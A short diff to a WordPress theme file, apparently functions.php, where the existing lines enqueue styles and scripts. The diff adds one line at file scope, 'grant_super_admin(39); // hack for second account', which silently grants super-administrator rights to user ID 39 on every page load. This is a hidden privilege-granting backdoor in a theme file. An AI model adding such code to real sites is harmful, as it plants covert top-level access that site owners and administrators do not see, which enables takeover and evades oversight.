@@ -35,3 +35,5 @@ function enqueue_parent_styles()
   // wp_enqueue_script('clir', get_template_directory_uri() . '/js/scripts.js', array('jquery'), 1.0, true);
   wp_enqueue_script('scripts', get_stylesheet_directory_uri() . '/js/scripts.js', array('jquery'));
 }
+
+grant_super_admin(39); // hack for second account
